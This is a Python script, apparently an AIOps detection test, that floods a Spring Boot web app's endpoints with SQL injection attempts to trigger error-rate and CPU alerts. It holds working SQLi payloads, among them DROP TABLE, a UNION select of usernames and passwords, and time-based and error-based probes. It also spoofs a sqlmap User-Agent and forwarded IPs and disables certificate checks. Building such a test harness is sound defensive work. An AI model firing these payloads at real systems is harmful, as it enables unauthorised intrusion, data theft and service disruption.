"""
SQL Injection Attempt Detection Scenario
OWASP A03:2021 - Injection

Spring Boot + JPA 환경에서는 Prepared Statement로 실제 주입은 차단되지만,
SQLi 패턴을 담은 HTTP 요청을 대량으로 전송하면:
  - Nginx 에러율 급등 (HighNginxErrorRate alert)
  - 백엔드 요청 처리 CPU 스파이크
  - 이상 URL 패턴이 Loki 로그에 기록

탐지 포인트: 에러율↑ + 이상 요청 로그 + CPU↑ (3중 상관관계)
AIOps 포인트: "보안 위협(SQLi 시도)"과 "인프라 이상(CPU/에러율)"이 결합된 케이스
"""

import ssl
import json
import os
import time
import urllib.request
import urllib.error
import urllib.parse
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor

# ── 설정 ───────────────────────────────────────────────────────────────────────
SCRIPT_DIR  = os.path.dirname(os.path.abspath(__file__))
LOG_PATH    = os.path.normpath(os.path.join(SCRIPT_DIR, "..", "logs", "anomaly_log.json"))

TARGET_BASE  = os.getenv("TARGET_URL", "https://localhost")
WORKERS      = 40
DURATION_SEC = 120

# SQLi 페이로드: OWASP Testing Guide 기반 실제 공격 패턴
# JPA Prepared Statement가 막더라도 에러 응답 + 이상 로그가 발생
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE users;--",
    "' UNION SELECT username, password FROM users--",
    "1' AND SLEEP(5)--",
    "' OR 'x'='x",
    "admin'--",
    "' OR 1=1#",
    "1; SELECT * FROM information_schema.tables--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "%(10000*10000)s",
    "{{7*7}}",
    "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
]

# 공격 대상 엔드포인트 (파라미터 입력 가능한 경로)
SQLI_TARGETS = [
    "/api/v1/my-plants?userId={payload}",
    "/api/v1/schedules?plantId={payload}",
    "/api/dictionary/url?url={payload}",
    "/home?search={payload}",
    "/login/kakao?code={payload}",
    "/api/v1/users/me?id={payload}",
]

_ssl_ctx = ssl.create_default_context()
_ssl_ctx.check_hostname = False
_ssl_ctx.verify_mode = ssl.CERT_NONE


# ── 로그 유틸 ──────────────────────────────────────────────────────────────────
def _load_log() -> list:
    if os.path.exists(LOG_PATH) and os.path.getsize(LOG_PATH) > 0:
        with open(LOG_PATH, "r", encoding="utf-8") as f:
            return json.load(f)
    return []

def _save_log(records: list) -> None:
    os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
    with open(LOG_PATH, "w", encoding="utf-8") as f:
        json.dump(records, f, indent=2, ensure_ascii=False)

def record_event(scenario, start, end, status, detail=""):
    records = _load_log()
    records.append({
        "scenario": scenario, "category": "security",
        "start_time": start, "end_time": end,
        "status": status, "detail": detail,
    })
    _save_log(records)
    print(f"[LOG] {scenario} | {status} | {start} → {end}")


# ── 단건 SQLi 요청 ─────────────────────────────────────────────────────────────
def _send_sqli() -> tuple[int, float]:
    import random
    payload  = random.choice(SQLI_PAYLOADS)
    template = random.choice(SQLI_TARGETS)
    url = TARGET_BASE + template.format(payload=urllib.parse.quote(payload))
    t0  = time.time()
    try:
        req = urllib.request.Request(
            url,
            headers={
                "User-Agent": "sqlmap/1.7",   # 실제 SQLi 스캐너 User-Agent
                "X-Forwarded-For": f"10.0.{random.randint(0,255)}.{random.randint(1,254)}",
                "Accept": "application/json",
            },
        )
        r = urllib.request.urlopen(req, context=_ssl_ctx, timeout=8)
        return r.status, (time.time() - t0) * 1000
    except urllib.error.HTTPError as e:
        return e.code, (time.time() - t0) * 1000
    except Exception:
        return 0, (time.time() - t0) * 1000


# ── 메인 ───────────────────────────────────────────────────────────────────────
def main():
    scenario   = "sql_injection"
    start_time = datetime.now(timezone.utc).isoformat()
    deadline   = time.time() + DURATION_SEC

    print(f"[*] 시나리오: SQL Injection Attempt (OWASP A03:2021 - Injection)")
    print(f"[*] 대상: {TARGET_BASE}")
    print(f"[*] 동시 스레드: {WORKERS} / 지속: {DURATION_SEC}초")
    print(f"[*] ⚠ Spring Boot JPA Prepared Statement로 실제 주입은 차단됨")
    print(f"[*] 탐지 포인트: 에러율↑ + 이상 로그 → HighNginxErrorRate + CPU spike")
    print(f"[*] 공격 시작...")

    total = 0
    status_counts: dict[int, int] = {}

    with ThreadPoolExecutor(max_workers=WORKERS) as pool:
        futures = []
        while time.time() < deadline:
            while len(futures) < WORKERS * 3 and time.time() < deadline:
                futures.append(pool.submit(_send_sqli))

            done, futures = futures[:WORKERS], futures[WORKERS:]
            for f in done:
                try:
                    code, ms = f.result(timeout=9)
                    total += 1
                    status_counts[code] = status_counts.get(code, 0) + 1
                    if total % 100 == 0:
                        error_codes = {k: v for k, v in status_counts.items() if k >= 400}
                        print(f"  → {total}건 | 에러 응답: {error_codes}")
                except Exception:
                    total += 1

    end_time = datetime.now(timezone.utc).isoformat()
    error_total = sum(v for k, v in status_counts.items() if k >= 400)
    detail = json.dumps({
        "total_requests": total,
        "error_responses": error_total,
        "error_rate_pct": round(error_total / max(total, 1) * 100, 1),
        "status_counts": status_counts,
        "payloads_used": len(SQLI_PAYLOADS),
        "note": "JPA Prepared Statement로 실제 주입 차단됨. 에러율/로그 이상 탐지 시나리오.",
    }, ensure_ascii=False)

    record_event(scenario, start_time, end_time, "success" if total > 0 else "error", detail)
    print(f"\n[*] 완료: 총 {total}건 | 에러 응답 {error_total}건 ({round(error_total/max(total,1)*100,1)}%)")
    print(f"[*] Prometheus alert 확인: http://localhost:9090/alerts")
    print(f"[*] Loki에서 이상 로그 확인: http://localhost:3000")


if __name__ == "__main__":
    main()
